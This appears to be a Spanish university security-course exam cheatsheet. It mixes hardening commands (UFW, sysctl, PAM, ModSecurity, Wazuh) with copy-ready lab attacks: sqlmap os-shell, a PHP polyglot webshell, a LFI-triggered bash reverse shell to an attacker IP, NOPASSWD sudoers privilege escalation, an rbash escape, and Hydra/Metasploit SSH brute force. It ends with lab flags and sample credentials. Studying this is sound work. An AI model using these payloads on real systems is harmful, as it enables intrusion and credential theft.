# SSI Cheatsheet de Examen

Version corta del archivo unificado. Todos los comandos aparecen con uso y ejemplo concreto para copiar/adaptar rapido.

## Indice

1. [Checklist Inicial de Examen](#checklist-inicial-de-examen)
2. [Linux, Rutas y Logs](#linux-rutas-y-logs)
3. [Nmap y Enumeracion](#nmap-y-enumeracion)
4. [Firewall UFW y Politicas sysctl](#firewall-ufw-y-politicas-sysctl)
5. [PAM: Calidad de Password y Bloqueo de Login](#pam-calidad-de-password-y-bloqueo-de-login)
6. [Criptografia, GPG, OpenSSL y Hashes](#criptografia-gpg-openssl-y-hashes)
7. [Web: Directorios, Backups y Git Expuesto](#web-directorios-backups-y-git-expuesto)
8. [SQL Injection y sqlmap](#sql-injection-y-sqlmap)
9. [LFI, Subida de Ficheros y Reverse Shell](#lfi-subida-de-ficheros-y-reverse-shell)
10. [ModSecurity, OWASP CRS y Fail2ban](#modsecurity-owasp-crs-y-fail2ban)
11. [Lynis, OpenSCAP y Wazuh](#lynis-openscap-y-wazuh)
12. [SAST, Dependencias y DAST](#sast-dependencias-y-dast)
13. [SMB/Samba](#smbsamba)
14. [Escalada de Privilegios y rbash](#escalada-de-privilegios-y-rbash)
15. [Ataques SSH/SFTP en Puerto No Estandar](#ataques-sshsftp-en-puerto-no-estandar)
16. [Datos Concretos de Tus Practicas](#datos-concretos-de-tus-practicas)

## Palabras Clave para Ctrl+F

`nmap`, `http-enum`, `ufw`, `sysctl`, `pam_pwquality`, `pam_faillock`, `openssl`, `gpg`, `hashcat`, `john`, `dirb`, `gobuster`, `feroxbuster`, `.git`, `sqlmap`, `LFI`, `reverse shell`, `ModSecurity`, `Fail2ban`, `Lynis`, `OpenSCAP`, `Wazuh`, `SMB`, `SUID`, `GTFOBins`, `rbash`, `hydra`, `msfconsole`.

## Checklist Inicial de Examen

Antes de tocar nada: identifica usuario, IP, rutas, objetivo y guarda evidencias.

```bash
# Ver usuario actual. Ejemplo: confirma si estas como root en Kali.
whoami

# Ver UID, GID y grupos. Ejemplo: detectar si perteneces a sudo.
id

# Ver IPs de la maquina. Ejemplo: localizar tu IP atacante 172.31.0.10.
ip a

# Ver puerta de enlace y red. Ejemplo: deducir que debes escanear 172.31.0.0/24.
ip route

# Ver nombre de maquina. Ejemplo: identificar si estas en kali, proxy o ubuntu-base.
hostname

# Ver directorio actual. Ejemplo: confirmar que estas en /examen antes de entregar.
pwd

# Listar ficheros con permisos. Ejemplo: comprobar si existe info.txt o secreto.asc.asc.
ls -la

# Ver permisos sudo del usuario. Ejemplo: detectar que user1 puede ejecutar /bin/cp.
sudo -l

# Guardar salida de cualquier comando. Ejemplo: guardar evidencia de nmap.
nmap -sV 172.31.0.22 | tee nmap_servicios.txt

# Guardar estado del firewall donde pida el enunciado.
sudo ufw status verbose | tee /examen/UO302313_firewall.txt
```

## Linux, Rutas y Logs

Rutas importantes: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers.d/`, `/var/log/auth.log`, `/var/www/html`, `/etc/apache2/`, `/etc/security/`.

```bash
# Buscar eventos de autenticacion de un usuario.
# Ejemplo: ver cambios/fallos de password de ssiuser.
sudo grep -i "ssiuser" /var/log/auth.log | grep -i "password\|passwd\|changed\|updated\|failed\|sudo"

# Ver estado de Apache. Ejemplo: comprobar si el servidor web esta activo.
sudo systemctl status apache2

# Reiniciar Apache tras cambiar ModSecurity/vhost.
sudo systemctl restart apache2

# Activar Apache al arranque y arrancarlo ahora.
sudo systemctl enable --now apache2

# Ver entrada completa de un usuario.
# Ejemplo: comprobar que tanda1 usa /bin/rbash.
getent passwd tanda1

# Buscar el usuario directamente en /etc/passwd.
grep '^tanda1:' /etc/passwd

# Cambiar shell de un usuario a rbash.
sudo chsh -s /bin/rbash tanda1
```

## Nmap y Enumeracion

Usa `-sV` cuando pidan puerto, estado, servicio y version. Usa `http-enum` cuando pidan rutas web conocidas.

```bash
# Descubrir hosts en una subred.
# Ejemplo LAB08: encontrar maquinas de 192.168.8.0/24.
sudo nmap 192.168.8.0/24

# Descubrir hosts en red Docker/lab.
# Ejemplo: detectar 172.31.0.22.
sudo nmap 172.31.0.0/24

# Detectar servicios y versiones.
# Ejemplo: genera salida para captura de examen.
sudo nmap -sV 172.31.0.22 | tee nmap_servicios.txt

# Ejecutar scripts NSE por defecto.
# Ejemplo: obtener banners, claves SSH y titulos HTTP.
sudo nmap --script default 192.168.8.69

# Buscar rutas conocidas en servicios HTTP.
# Ejemplo: detectar aplicaciones web en Ubuntu base.
sudo nmap -sV --script http-enum -p 80,8080,443 172.31.0.22 | tee nmap_http_enum.txt

# Enumerar SMB/Samba en puertos 139/445.
# Ejemplo: buscar shares anonimos.
nmap --script smb-enum-shares,smb-os-discovery -p 139,445 172.31.0.22

# Consultar version de DNS/BIND.
# Ejemplo: ver version del DNS 192.168.8.2.
nmap -sV -p 53 192.168.8.2
```

## Firewall UFW y Politicas sysctl

Tipico de examen: abrir/cerrar puertos y desactivar politicas de red. Cambia `2313` por los 4 ultimos digitos de tu UO si lo piden.

```bash
# Activar UFW. Usalo antes de crear/ver reglas si esta inactivo.
sudo ufw enable

# Abrir SSH.
sudo ufw allow 22/tcp

# Abrir puerto 934/tcp pedido por examen.
sudo ufw allow 934/tcp

# Abrir puerto 386/tcp pedido por examen.
sudo ufw allow 386/tcp

# Cerrar/denegar puerto concreto.
# Ejemplo: si los 4 ultimos digitos UO son 2313.
sudo ufw deny 2313/tcp

# Ver reglas numeradas para borrar por numero.
sudo ufw status numbered

# Volcar estado del firewall a fichero de entrega.
sudo ufw status verbose | tee /examen/UO302313_firewall.txt

# Borrar una regla por numero.
# Ejemplo: borrar la regla 4 que viste con status numbered.
sudo ufw delete 4

# Editar configuracion persistente de kernel/red.
sudo nano /etc/sysctl.d/99-ssi-examen.conf
```

Contenido de ejemplo para `/etc/sysctl.d/99-ssi-examen.conf`:

```text
net.ipv6.conf.all.accept_redirects = 0
net.ipv6.conf.default.accept_redirects = 0
net.ipv6.conf.all.accept_ra = 0
net.ipv6.conf.default.accept_ra = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0
net.ipv6.conf.default.accept_source_route = 0
```

```bash
# Aplicar todos los ficheros sysctl.
sudo sysctl --system

# Verificar redirects IPv6 desactivados.
sysctl net.ipv6.conf.all.accept_redirects net.ipv6.conf.default.accept_redirects

# Verificar router advertisements IPv6 desactivados.
sysctl net.ipv6.conf.all.accept_ra net.ipv6.conf.default.accept_ra

# Verificar source-routed packets IPv4 desactivados.
sysctl net.ipv4.conf.all.accept_source_route net.ipv4.conf.default.accept_source_route

# Verificar source-routed packets IPv6 desactivados.
sysctl net.ipv6.conf.all.accept_source_route net.ipv6.conf.default.accept_source_route
```

## PAM: Calidad de Password y Bloqueo de Login

Para password policy usa `pam_pwquality`; para bloqueo tras fallos usa `pam_faillock`.

```bash
# Actualizar repositorios antes de instalar paquetes.
sudo apt update

# Instalar modulo de calidad de contrasenas.
sudo apt install libpam-pwquality

# Editar politica de contrasenas.
sudo nano /etc/security/pwquality.conf
```

Ejemplo de `/etc/security/pwquality.conf`:

```text
# Minimo 22 caracteres.
minlen = 22

# Exigir X digitos. Ejemplo: si ultimo digito UO=3, X=4.
dcredit = -4
```

```bash
# Verificar que PAM usa pam_pwquality al cambiar password.
grep -R "pam_pwquality" /etc/pam.d/common-password

# Editar bloqueo por intentos fallidos.
sudo nano /etc/security/faillock.conf
```

Ejemplo de `/etc/security/faillock.conf`:

```text
# Bloquear tras 5 fallos.
deny = 5

# Bloquear durante 20 minutos = 1200 segundos.
unlock_time = 1200

# Ventana de conteo de fallos, ejemplo 15 minutos.
fail_interval = 900
```

```bash
# Habilitar perfil faillock si existe en pam-auth-update.
sudo pam-auth-update --enable faillock

# Comprobar que common-auth carga faillock.
grep faillock /etc/pam.d/common-auth

# Ver fallos registrados para usuario.
faillock --user ssiuser

# Resetear contador de fallos para usuario.
faillock --user ssiuser --reset
```

## Criptografia, GPG, OpenSSL y Hashes

Recuerda: si un fichero fue cifrado primero simetrico y luego asimetrico, se descifra al reves.

```bash
# Crackear ZIP por fuerza bruta: letras minusculas, mayusculas y numeros, longitud 1-6.
fcrackzip -b -c 'aA1' -l 1-6 -u UO302313.zip

# Descomprimir ZIP tras encontrar password.
unzip UO302313.zip

# Crear diccionario desde web con CeWL.
cewl http://156.35.163.140:777 -m 1 -d 4 --with-numbers -w diccionario.txt

# Crackear password steghide con stegseek.
stegseek imagen_correcta.jpg diccionario.txt

# Extraer contenido oculto con password conocida.
steghide extract -sf imagen_correcta.jpg -p "Contact"

# Descifrar con OpenSSL AES-192-CBC usando clave e IV hexadecimales.
openssl enc -d -aes-192-cbc -in UO302313_mensaje.enc -out mensaje.txt -K 49d32a54f7d47a048c45a826ddf8843d -iv f7ab03abeca859e33bcf577713d855ea

# Decodificar Base64.
base64 -d mensaje.txt > mensaje_final.txt
```

GPG:

```bash
# Listar claves privadas disponibles para saber TU_KEYID.
gpg --list-secret-keys

# Importar clave publica del profesor.
gpg --import clave_publica_profesor.asc

# Descifrar primera capa asimetrica.
gpg --output secreto.asc --decrypt secreto_uo302313.asc.asc

# Descifrar segunda capa simetrica.
gpg --output secreto.txt --decrypt secreto.asc

# Firmar en claro y armored con tu clave.
gpg --armor --clearsign --local-user UO302313 --output secreto_firmado.asc secreto.txt

# Verificar firma generada.
gpg --verify secreto_firmado.asc

# Cifrar para profesor y firmar a la vez.
gpg --armor --encrypt --sign -r KEYID_PROFESOR --local-user UO302313 -o salida.asc fichero.txt
```

Hashes, SSH y certificados:

```bash
# Identificar tipo de hash.
hashid hash.txt

# Crackear SHA-256 con hashcat y rockyou.
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crackear SHA-256 con John.
john hash.txt --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt

# Proteger clave privada SSH.
chmod 600 clave_privada_UO302313_id_rsa

# Conectar por SSH con clave y puerto no estandar.
ssh -i clave_privada_UO302313_id_rsa -p 2222 UO302313@156.35.163.140

# Generar clave RSA y CSR.
openssl req -newkey rsa:2048 -keyout mi_clave_privada.key -out mi_csr.csr -nodes

# Cifrar token con clave publica de profesores.
openssl pkeyutl -encrypt -pubin -inkey public_key_profesores.pem -in token -out token_cifrado.enc

# Firmar fichero cifrado con clave privada propia.
openssl dgst -sha256 -sign mi_clave_privada.key -out token_cifrado.sig token_cifrado.enc
```

## Web: Directorios, Backups y Git Expuesto

Enumera rutas y extensiones sensibles: `.bak`, `.old`, `.zip`, `.git`, `.txt`.

```bash
# Enumerar rutas con DIRB.
dirb http://172.31.0.22 /usr/share/dirb/wordlists/common.txt

# Enumerar rutas con Gobuster y extensiones comunes.
gobuster dir -u http://172.31.0.22/ -w /usr/share/wordlists/dirb/common.txt -x txt,html,old,bak,zip,git

# Enumerar recursivamente con Feroxbuster, ocultando 403.
feroxbuster -u http://172.31.0.22/ -w /usr/share/wordlists/dirb/common.txt -x txt,html,old,bak,zip,git -d 2 -t 20 -C 403 -o ferox_results.txt

# Descargar .git expuesto.
wget -q -r -np -nH --cut-dirs=1 -R "index.html*" http://172.31.0.22/.git/ -P .git/

# Crear carpeta para reconstruir repo.
mkdir -p recovered_repo

# Recuperar ficheros versionados desde .git descargado.
git --git-dir=.git --work-tree=recovered_repo checkout -f

# Ver estado del repo recuperado.
git --git-dir=.git --work-tree=. status

# Restaurar ficheros versionados en el work-tree actual.
git --git-dir=.git --work-tree=. restore .

# Leer backup con credenciales.
curl http://172.31.0.22/backups/config.bak

# Leer robots.txt para rutas disallowed.
curl http://172.31.0.22/robots.txt

# Ver cabeceras HTTP.
curl -I http://172.31.0.22/
```

## SQL Injection y sqlmap

Primero identifica parametros en navegador/devtools; despues usa sqlmap con POST, GET o cookies.

```bash
# Enumerar tablas en login POST.
sqlmap -u "http://172.31.0.40" --data="username=test&password=test" --batch --tables

# Volcar tabla products.
sqlmap -u "http://172.31.0.40" --data="username=test&password=test" --batch -T products --dump

# Volcar toda la base de datos accesible.
sqlmap -u "http://172.31.0.40" --data="username=test&password=test" --batch --dump

# Probar tecnica boolean-based blind en parametro id.
sqlmap -u "http://172.31.0.40/product.php?id=1" --batch --technique=B --dbms=SQLite

# Probar tecnica UNION-based.
sqlmap -u "http://172.31.0.40/product.php?id=1" --batch --technique=U --dbms=SQLite

# Probar tecnica time-based blind con mas nivel/riesgo.
sqlmap -u "http://172.31.0.40/product.php?id=1" --batch --technique=T --dbms=SQLite --risk=3 --level=5

# Probar inyeccion en cookie user.
sqlmap -u "http://172.31.0.40/cookie_lab.php" --cookie="user=alice" --batch --level=2

# Intentar os-shell/webshell en MySQL escribiendo en /var/www/html.
sqlmap -u "http://172.31.0.50/rce_sqli.php?id=1" -p id --dbms=mysql --os-shell --web-root="/var/www/html" --batch

# Limpiar cache de sqlmap para repetir pruebas desde cero.
rm -rf /root/.local/share/sqlmap/output/172.31.0.40/*
```

## LFI, Subida de Ficheros y Reverse Shell

Si la app valida solo extension, sube `.php.jpg` y ejecutalo mediante inclusion vulnerable. Prueba primero `id`.

```bash
# Crear polyglot partiendo de una imagen valida.
cp eii.jpg polyglot.jpg

# Anadir PHP al final de la imagen.
printf "\n<?php system(\$_GET['cmd']); ?>\n" >> polyglot.jpg

# Renombrar con doble extension.
mv polyglot.jpg shell_polyglot.php.jpg

# Verificar tipo detectado.
file shell_polyglot.php.jpg
```

Payload PHP limpio para subir como `.jpg`:

```php
<?php
echo "BEGIN\n";
system($_GET['cmd'] ?? 'id');
echo "\nEND\n";
?>
```

```bash
# Guardar el payload anterior en fichero.
nano lfi_payload.php.jpg

# Ejecutar id mediante LFI y filtrar salida util.
curl -s "http://172.31.0.90/view.php?page=uploads/shell_polyglot.php.jpg&cmd=id" | strings | grep -iE "uid=|gid="

# Escuchar reverse shell en atacante.
nc -lvnp 4444
```

URL de ejemplo para lanzar reverse shell desde la LFI:

```text
http://172.31.0.90/view.php?page=uploads/lfi_payload.php.jpg&cmd=bash -c 'bash -i >& /dev/tcp/172.31.0.10/4444 0>&1'
```

## ModSecurity, OWASP CRS y Fail2ban

Para examen: activar motor, crear regla, probar con `curl`, mirar logs.

```bash
# Instalar Apache y ModSecurity.
sudo apt install apache2 libapache2-mod-security2

# Activar modulos de proxy y security2.
sudo a2enmod proxy proxy_http security2

# Activar configuracion recomendada de ModSecurity.
sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf

# Editar configuracion principal.
sudo nano /etc/modsecurity/modsecurity.conf
```

Dentro de `/etc/modsecurity/modsecurity.conf`:

```apache
SecRuleEngine On
```

Regla de ejemplo para `moria=balrog`, estado `401`, mensaje `you shall not pass!`:

```apache
<IfModule security2_module>
    SecRuleEngine On
    SecRule ARGS:moria "@streq balrog" "id:100100,phase:2,deny,status:401,log,msg:'you shall not pass!'"
</IfModule>
```

```bash
# Verificar sintaxis Apache.
sudo apachectl configtest

# Reiniciar Apache tras cambiar reglas.
sudo systemctl restart apache2

# Activar alarma intencionadamente.
curl -i "http://192.168.92.1/?moria=balrog"

# Ver logs Apache.
sudo tail -n 50 /var/log/apache2/error.log

# Ver audit log de ModSecurity si existe.
sudo tail -n 50 /var/log/modsec_audit.log

# Copiar configuracion base OWASP CRS si lo piden.
sudo cp crs-setup.conf.example /etc/modsecurity/crs-setup.conf

# Copiar reglas OWASP CRS.
sudo cp -r rules/ /etc/modsecurity/

# Instalar Fail2ban.
sudo apt install fail2ban

# Ver jails activas.
fail2ban-client status

# Ver estado de jail SSH.
fail2ban-client status sshd

# Desbanear IP concreta.
fail2ban-client set sshd unbanip 192.168.92.50
```

## Lynis, OpenSCAP y Wazuh

Auditoria: ejecuta, guarda informe y verifica resultado.

```bash
# Instalar Lynis.
sudo apt install lynis

# Auditoria Lynis y guardar salida.
sudo lynis audit system | tee lynis.txt

# Ver perfiles OpenSCAP disponibles.
oscap info scap-security-guide-0.1.79/ssg-ubuntu2404-ds.xml

# Evaluar CIS Level 1 Server y generar XML+HTML.
oscap xccdf eval \
  --profile xccdf_org.ssgproject.content_profile_cis_level1_server \
  --results results.xml \
  --report report.html \
  scap-security-guide-0.1.79/ssg-ubuntu2404-ds.xml

# Generar script bash de remediacion.
oscap xccdf generate fix \
  --profile xccdf_org.ssgproject.content_profile_cis_level1_server \
  --fix-type bash \
  scap-security-guide-0.1.79/ssg-ubuntu2404-ds.xml > remediacion.sh

# Activar agente Wazuh.
sudo systemctl enable --now wazuh-agent

# Ver alertas Wazuh en tiempo real.
tail -f /var/ossec/logs/alerts/alerts.log

# Probar reglas de Wazuh con logtest.
/var/ossec/bin/wazuh-logtest
```

FIM en `/var/ossec/etc/ossec.conf`:

```xml
<syscheck>
  <directories realtime="yes" check_all="yes">/var/www/html,/etc/apache2</directories>
</syscheck>
```

## SAST, Dependencias y DAST

Para AppSec: manual + SAST + dependencias + DAST.

```bash
# Anadir SonarAnalyzer a proyecto C#.
dotnet add package SonarAnalyzer.CSharp

# Listar paquetes vulnerables.
dotnet list package --vulnerable

# Descargar OWASP ZAP estable.
docker pull zaproxy/zap-stable

# Ejecutar baseline DAST contra Apache local y generar informe HTML.
docker run --network host -v $(pwd):/zap/wrk/:rw -t zaproxy/zap-stable zap-baseline.py -t http://localhost:1080 -r informeZAP.html
```

## SMB/Samba

Si ves 139/445, intenta enumerar shares anonimos y descargar pistas.

```bash
# Enumerar shares y sistema por Nmap.
nmap --script smb-enum-shares,smb-os-discovery -p 139,445 172.31.0.22

# Listar recursos compartidos sin contrasena.
smbclient -L //172.31.0.22/ -N

# Entrar al recurso public sin contrasena.
smbclient //172.31.0.22/public -N
```

Dentro de `smbclient`:

```text
# Listar ficheros remotos.
ls

# Ver directorio remoto actual.
pwd

# Descargar fichero.
get readme.txt

# Activar recursion.
recurse

# Desactivar preguntas en descargas multiples.
prompt

# Descargar todo.
mget *
```

## Escalada de Privilegios y rbash

Orden: `sudo -l`, SUID, GTFOBins, escritura en sudoers o escape de shell restringida.

```bash
# Ver usuario actual.
whoami

# Ver grupos/permisos.
id

# Ver comandos sudo permitidos.
sudo -l

# Buscar binarios SUID.
find / -perm -4000 -type f 2>/dev/null

# user1: crear regla sudoers temporal.
echo "user1 ALL=(ALL) NOPASSWD: ALL" > /tmp/user1

# user1: copiar regla a sudoers.d usando sudo cp permitido.
sudo /bin/cp /tmp/user1 /etc/sudoers.d/user1

# Abrir shell root.
sudo -i

# user2: escribir sudoers con python3 ejecutado como root.
sudo python3 -c 'open("/etc/sudoers.d/user2","w+").write("user2 ALL=(ALL) NOPASSWD: ALL\n")'

# user3: escribir sudoers con tee ejecutado como root.
echo "user3 ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/user3

# user4: preparar sudoers manteniendo contenido valido previo.
cat /etc/sudoers.d/user1 > /tmp/sudoers_user4

# user4: anadir regla.
echo "user4 ALL=(ALL) NOPASSWD: ALL" >> /tmp/sudoers_user4

# user4: sobrescribir fichero sudoers valido con dd SUID.
/usr/bin/dd if=/tmp/sudoers_user4 of=/etc/sudoers.d/user1

# Crear usuario con shell restringida rbash.
sudo useradd -m -s /bin/rbash tanda1

# Asignar password al usuario tanda1.
sudo passwd tanda1

# Verificar shell restringida.
getent passwd tanda1

# Entrar como tanda1.
su - tanda1
```

Escape de `rbash` con `gcc`:

```c
#include <stdlib.h>
int main(){ system("/bin/sh"); return 0; }
```

```bash
# Guardar codigo C anterior.
nano shell.c

# Compilar binario.
gcc shell.c -o shell

# Ejecutar y obtener /bin/sh.
./shell
```

## Ataques SSH/SFTP en Puerto No Estandar

SFTP usa autenticacion SSH. En laboratorio autorizado, si el puerto es 7777, fuerza `-s 7777` en Hydra o `RPORT 7777` en Metasploit.

```bash
# Crear lista de usuarios sospechosos.
printf "Anacleto\nBonifacio\n" > users.txt

# Hydra contra SSH/SFTP en puerto 7777.
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 7777 -t 4 -V 156.35.100.100 ssh

# Abrir Metasploit.
msfconsole

# Usar modulo de login SSH.
use auxiliary/scanner/ssh/ssh_login

# Configurar IP objetivo.
set RHOSTS 156.35.100.100

# Configurar puerto no estandar.
set RPORT 7777

# Configurar fichero de usuarios.
set USER_FILE users.txt

# Configurar diccionario de passwords.
set PASS_FILE /usr/share/wordlists/rockyou.txt

# Parar cuando encuentre credenciales validas.
set STOP_ON_SUCCESS true

# Mostrar opciones para captura de examen.
show options

# Ejecutar ataque.
run
```

## Datos Concretos de Tus Practicas

Solo lo mas buscable del laboratorio propio; el documento largo conserva todo el detalle.

- CTF LAB02: `SSI_P1_2ddcc781905bfe6a`, `SSI_P2_e8611d13d2aa4adf`, `SSI_P3_b659f42158bea1be`.
- Cripto: usuario `UO302313`, steghide password `Contact`, algoritmo correcto `AES-192-CBC`.
- Cripto: IV `f7ab03abeca859e33bcf577713d855ea`, password local `ATHFCHARACTERS`.
- LAB05: Lynis baseline `Hardening index 62`; perfil OpenSCAP `cis_level1_server`.
- LAB08: subred `192.168.8.0/24`; host expuesto `192.168.8.69`; claves SSH duplicadas `192.168.8.48`/`192.168.8.69`.
- LAB10-12: SQLi `172.31.0.40`; webshell `172.31.0.50`; objetivo step4 `172.31.0.22`; LFI `172.31.0.90`.

```text
# Rutas/valores utiles para Ctrl+F.
/root/.local/share/sqlmap/output
http://172.31.0.22/.git/HEAD
http://172.31.0.22/backups/config.bak
DB_HOST=acme-db.internal
DB_USER=acme_app
DB_PASSWORD=SuperSecret123
//172.31.0.22/public
GTFOBins: https://gtfobins.org/
```
